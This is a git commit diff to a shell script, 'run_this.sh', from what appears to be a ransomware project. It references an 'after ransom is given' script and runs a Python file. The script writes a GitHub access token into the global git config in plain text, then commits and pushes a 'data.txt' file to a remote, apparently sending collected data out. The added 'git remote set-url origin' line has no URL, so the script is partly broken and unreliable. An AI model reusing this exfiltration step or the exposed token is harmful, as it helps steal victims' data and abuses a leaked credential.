c69b2299318d4af714e2e3ff5a1ac610eb4e28c9
samsepi0lw <147035842+samsepi0lw@users.noreply.github.com>
2023-10-07 14:09:47 +0000

    Update run_this.sh

--- run_this.sh
+++ run_this.sh
@@ -5,10 +5,12 @@ mv after_ransom_is_given_run_this.sh\?raw=true after_ransom_is_given_run_this.sh
 clear
 #!/bin/bash
 python monsterwith23faces.py
+echo "hejsa"
 git config --global user.name samsepi0lw
 git config --global user.email samsepi0lw@proton.me
 git config --global github.user samsepi0lw
 git config --global github.token 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
+git remote set-url origin
 git add ./data.txt
 git commit -m "Uploaded data file"
 git push origin master
